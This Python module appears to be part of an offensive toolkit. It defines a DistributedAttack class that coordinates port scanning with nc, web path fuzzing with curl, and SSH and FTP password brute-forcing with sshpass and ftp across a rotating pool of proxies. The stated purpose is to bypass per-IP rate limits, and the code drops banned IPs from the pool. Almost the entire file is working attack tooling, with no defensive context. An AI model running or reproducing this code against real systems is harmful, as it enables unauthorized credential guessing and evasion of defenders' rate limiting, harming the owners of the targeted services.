#!/usr/bin/env python3
"""
Distributed Attack Manager
Coordinate attacks from multiple IPs simultaneously to bypass rate limits
"""

import asyncio
import random
from typing import Dict, List, Any, Optional, Callable
from ..core.config import TacticalConfig
from ..core.async_executor import AsyncExecutor


class DistributedAttack:
    """
    Manage distributed attacks using IP pool
    Bypasses per-IP rate limits by distributing requests across multiple sources
    """
    
    def __init__(self):
        """Initialize distributed attack manager"""
        self.config = TacticalConfig
        self.executor = AsyncExecutor()
        
        # IP pool management
        self.active_ips: List[str] = self.config.IP_POOL.copy()
        self.failed_ips: List[str] = []
        
        # Statistics
        self.stats: Dict[str, Dict[str, int]] = {}
    
    async def distributed_port_scan(
        self,
        target: str,
        ports: List[int],
        max_concurrent: int = None
    ) -> Dict[str, Any]:
        """
        Distribute port scanning across multiple IPs
        
        Args:
            target: Target to scan
            ports: List of ports to scan
            max_concurrent: Maximum concurrent scans
            
        Returns:
            Dictionary with scan results
        """
        max_concurrent = max_concurrent or len(self.active_ips)
        
        # Divide ports among available IPs
        port_chunks = self._chunk_list(ports, len(self.active_ips))
        
        results = {
            'target': target,
            'total_ports': len(ports),
            'ips_used': [],
            'open_ports': [],
            'scan_time': 0
        }
        
        # Create tasks for each IP
        import time
        start_time = time.time()
        
        tasks = []
        for i, (proxy, port_chunk) in enumerate(zip(self.active_ips, port_chunks)):
            if port_chunk:  # Only if there are ports to scan
                task = self._scan_ports_with_proxy(
                    target,
                    port_chunk,
                    proxy,
                    task_id=f"scan_{i}"
                )
                tasks.append(task)
                results['ips_used'].append(proxy)
        
        # Execute all scans in parallel
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Aggregate results
        for result in scan_results:
            if isinstance(result, dict) and result.get('open_ports'):
                results['open_ports'].extend(result['open_ports'])
        
        results['scan_time'] = time.time() - start_time
        results['open_ports'] = sorted(list(set(results['open_ports'])))
        
        return results
    
    async def _scan_ports_with_proxy(
        self,
        target: str,
        ports: List[int],
        proxy: str,
        task_id: str
    ) -> Dict[str, Any]:
        """Scan ports using specific proxy"""
        open_ports = []
        
        for port in ports:
            # Use nmap through proxy (requires proxychains configuration)
            command = f"timeout 10 nc -zv -w 2 {target} {port} 2>&1"
            
            stdout, stderr, returncode = await self.executor.run_command(
                command,
                timeout=15,
                proxy=proxy if self.config.ENABLE_PROXY_ROTATION else None
            )
            
            output = stdout + stderr
            
            if 'succeeded' in output.lower() or 'open' in output.lower():
                open_ports.append(port)
        
        # Update statistics
        if task_id not in self.stats:
            self.stats[task_id] = {'scanned': 0, 'found': 0}
        
        self.stats[task_id]['scanned'] += len(ports)
        self.stats[task_id]['found'] += len(open_ports)
        
        return {
            'task_id': task_id,
            'proxy': proxy,
            'ports_scanned': len(ports),
            'open_ports': open_ports
        }
    
    async def distributed_web_fuzzing(
        self,
        target_url: str,
        wordlist_path: str,
        threads_per_ip: int = 10
    ) -> Dict[str, Any]:
        """
        Distribute web directory fuzzing across multiple IPs
        
        Args:
            target_url: Target URL
            wordlist_path: Path to wordlist
            threads_per_ip: Threads per IP source
            
        Returns:
            Dictionary with discovered paths
        """
        # Read wordlist
        try:
            with open(wordlist_path, 'r') as f:
                words = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            return {'error': 'Wordlist not found'}
        
        # Limit wordlist size for distributed attack
        if len(words) > 10000:
            words = words[:10000]
        
        # Divide wordlist among IPs
        word_chunks = self._chunk_list(words, len(self.active_ips))
        
        results = {
            'target': target_url,
            'total_words': len(words),
            'ips_used': [],
            'discovered': []
        }
        
        # Create tasks
        tasks = []
        for i, (proxy, word_chunk) in enumerate(zip(self.active_ips, word_chunks)):
            if word_chunk:
                task = self._fuzz_with_proxy(
                    target_url,
                    word_chunk,
                    proxy,
                    task_id=f"fuzz_{i}"
                )
                tasks.append(task)
                results['ips_used'].append(proxy)
        
        # Execute
        fuzz_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Aggregate
        for result in fuzz_results:
            if isinstance(result, dict) and result.get('discovered'):
                results['discovered'].extend(result['discovered'])
        
        results['total_discovered'] = len(results['discovered'])
        
        return results
    
    async def _fuzz_with_proxy(
        self,
        base_url: str,
        words: List[str],
        proxy: str,
        task_id: str
    ) -> Dict[str, Any]:
        """Fuzz directories using specific proxy"""
        discovered = []
        
        # Test a sample of words (to avoid timeout)
        sample_size = min(len(words), 100)
        sample_words = random.sample(words, sample_size)
        
        for word in sample_words:
            url = f"{base_url.rstrip('/')}/{word}"
            
            # Use curl with proxy
            proxy_flag = f"--proxy {proxy}" if self.config.ENABLE_PROXY_ROTATION else ""
            command = f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 {proxy_flag} {url}"
            
            stdout, stderr, returncode = await self.executor.run_command(
                command,
                timeout=10
            )
            
            status_code = stdout.strip()
            
            if status_code in ['200', '201', '301', '302', '401', '403']:
                discovered.append({
                    'path': word,
                    'url': url,
                    'status': status_code
                })
        
        return {
            'task_id': task_id,
            'proxy': proxy,
            'words_tested': len(sample_words),
            'discovered': discovered
        }
    
    async def distributed_brute_force(
        self,
        target: str,
        service: str,
        username: str,
        password_list: List[str]
    ) -> Dict[str, Any]:
        """
        Distribute brute force attack across multiple IPs
        
        Args:
            target: Target IP/domain
            service: Service to attack (ssh/ftp/http)
            username: Username to test
            password_list: List of passwords
            
        Returns:
            Dictionary with results
        """
        # Divide passwords among IPs
        pass_chunks = self._chunk_list(password_list, len(self.active_ips))
        
        results = {
            'target': target,
            'service': service,
            'username': username,
            'passwords_tested': len(password_list),
            'ips_used': [],
            'success': False,
            'valid_password': None
        }
        
        # Create tasks
        tasks = []
        for i, (proxy, pass_chunk) in enumerate(zip(self.active_ips, pass_chunks)):
            if pass_chunk:
                task = self._brute_force_with_proxy(
                    target,
                    service,
                    username,
                    pass_chunk,
                    proxy,
                    task_id=f"brute_{i}"
                )
                tasks.append(task)
                results['ips_used'].append(proxy)
        
        # Execute (stop on first success)
        for completed in asyncio.as_completed(tasks):
            result = await completed
            
            if isinstance(result, dict) and result.get('success'):
                results['success'] = True
                results['valid_password'] = result['password']
                
                # Cancel remaining tasks
                for task in tasks:
                    if not task.done():
                        task.cancel()
                
                break
        
        return results
    
    async def _brute_force_with_proxy(
        self,
        target: str,
        service: str,
        username: str,
        passwords: List[str],
        proxy: str,
        task_id: str
    ) -> Dict[str, Any]:
        """Brute force using specific proxy"""
        
        for password in passwords:
            # Build service-specific command
            if service == 'ssh':
                # Note: This is a simplified example
                # Real implementation would use proper SSH library or hydra
                command = f"timeout 10 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target} 'echo success' 2>&1"
            
            elif service == 'ftp':
                command = f"timeout 10 ftp -inv {target} << EOF\nuser {username} {password}\nbye\nEOF 2>&1"
            
            else:
                continue
            
            stdout, stderr, returncode = await self.executor.run_command(
                command,
                timeout=15
            )
            
            # Check for success indicators
            if returncode == 0 or 'success' in stdout.lower():
                return {
                    'task_id': task_id,
                    'proxy': proxy,
                    'success': True,
                    'password': password
                }
        
        return {
            'task_id': task_id,
            'proxy': proxy,
            'success': False,
            'passwords_tested': len(passwords)
        }
    
    def _chunk_list(self, lst: List[Any], n: int) -> List[List[Any]]:
        """Divide list into n chunks"""
        if n <= 0:
            return [lst]
        
        chunk_size = len(lst) // n
        remainder = len(lst) % n
        
        chunks = []
        start = 0
        
        for i in range(n):
            # Distribute remainder across first chunks
            size = chunk_size + (1 if i < remainder else 0)
            chunks.append(lst[start:start + size])
            start += size
        
        return [chunk for chunk in chunks if chunk]  # Remove empty chunks
    
    def add_ip_to_pool(self, proxy: str):
        """Add a new IP/proxy to the pool"""
        if proxy not in self.active_ips:
            self.active_ips.append(proxy)
    
    def remove_ip_from_pool(self, proxy: str):
        """Remove IP/proxy from pool (e.g., if banned)"""
        if proxy in self.active_ips:
            self.active_ips.remove(proxy)
            self.failed_ips.append(proxy)
    
    def get_pool_status(self) -> Dict[str, Any]:
        """Get status of IP pool"""
        return {
            'active_ips': len(self.active_ips),
            'failed_ips': len(self.failed_ips),
            'total_configured': len(self.config.IP_POOL),
            'active_list': self.active_ips,
            'stats': self.stats
        }


if __name__ == "__main__":
    # Test the module
    async def test():
        distributed = DistributedAttack()
        
        print("Testing DistributedAttack...")
        print("=" * 60)
        
        # Test port scanning distribution
        print("\n1. Testing distributed port scan:")
        print(f"  IP pool size: {len(distributed.active_ips)}")
        
        # Simulate port list
        test_ports = list(range(1, 101))  # Ports 1-100
        
        print(f"  Dividing {len(test_ports)} ports among {len(distributed.active_ips)} IPs")
        
        chunks = distributed._chunk_list(test_ports, len(distributed.active_ips))
        for i, chunk in enumerate(chunks):
            print(f"    IP {i+1}: {len(chunk)} ports")
        
        # Test pool status
        print("\n2. IP Pool Status:")
        status = distributed.get_pool_status()
        for key, value in status.items():
            if key != 'active_list':  # Don't print full list
                print(f"  {key}: {value}")
        
        print("\n✅ Tests completed")
    
    asyncio.run(test())
